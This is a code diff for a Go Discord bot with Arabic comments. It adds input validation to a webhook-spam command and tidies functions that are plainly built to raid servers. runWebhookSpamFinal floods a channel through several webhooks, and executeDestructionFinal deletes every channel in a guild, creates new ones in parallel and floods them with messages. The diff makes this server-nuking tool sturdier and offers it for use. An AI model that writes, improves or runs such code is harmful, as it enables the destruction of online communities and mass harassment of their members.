@@ -116,6 +116,25 @@ func main() {
 		cmdName := i.ApplicationCommandData().Name
 
 		if cmdName == cmdWhSpam {
+			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
+			for _, opt := range i.ApplicationCommandData().Options {
+				optionMap[opt.Name] = opt
+			}
+
+			// حماية آمنة لجلب الـ Channel ID لمنع الـ Panic على Railway
+			optChannel, exists := optionMap["channel"]
+			if !exists || optChannel.ChannelValue(s) == nil {
+				s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
+					Type: discordgo.InteractionResponseChannelMessageWithSource,
+					Data: &discordgo.InteractionResponseData{
+						Content: "❌ خطأ: لم يتم تحديد الروم بشكل صحيح أو البوت لا يملك صلاحية رؤيته في الـ State.",
+						Flags:   discordgo.MessageFlagsEphemeral,
+					},
+				})
+				return
+			}
+			channelID := optChannel.ChannelValue(s).ID
+
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
@@ -124,12 +143,6 @@ func main() {
 				},
 			})
 
-			optionMap := make(map[string]*discordgo.ApplicationCommandInteractionDataOption)
-			for _, opt := range i.ApplicationCommandData().Options {
-				optionMap[opt.Name] = opt
-			}
-
-			channelID := optionMap["channel"].ChannelValue(s).ID
 			messageContent := optionMap["message_content"].StringValue()
 			webhookName := optionMap["webhook_name"].StringValue()
 			messagesCount := int(optionMap["messages_count"].IntValue())
@@ -231,7 +244,6 @@ func deleteSingleWebhook(token, webhookID string) {
 	}
 }
 
-// دالة السبام النهائية المستقرة
 func runWebhookSpamFinal(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
 	const activeCount = 5
 	webhooks := make([]WebhookInfo, activeCount)
@@ -315,7 +327,6 @@ func runWebhookSpamFinal(token, channelID, webhookName, messageContent string, t
 	s.ChannelMessageSend(channelID, "⚡ تم الانتهاء من إرسال كافة الرسائل بأقصى سرعة واستبدال البطيء بنجاح!")
 }
 
-// دالة التدمير النهائية المستقرة
 func executeDestructionFinal(s *discordgo.Session, token, guildID, roomName string, roomsCount int, messageContent string, messagesCount int) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
@@ -323,7 +334,6 @@ func executeDestructionFinal(s *discordgo.Session, token, guildID, roomName stri
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية دفعة واحدة وبشكل آمن
 	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
 		for k, v := range headers {
@@ -355,7 +365,6 @@ func executeDestructionFinal(s *discordgo.Session, token, guildID, roomName stri
 		}
 	}
 
-	// 2. إنشاء الرومات الجديدة بالتوازي المنظم
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -393,7 +402,6 @@ func executeDestructionFinal(s *discordgo.Session, token, guildID, roomName stri
 	}
 	wgCreate.Wait()
 
-	// 3. إرسال الرسائل في الرومات الجديدة بأقصى سرعة
 	var wgMsg sync.WaitGroup
 	for _, chID := range channelIDs {
 		wgMsg.Add(1)
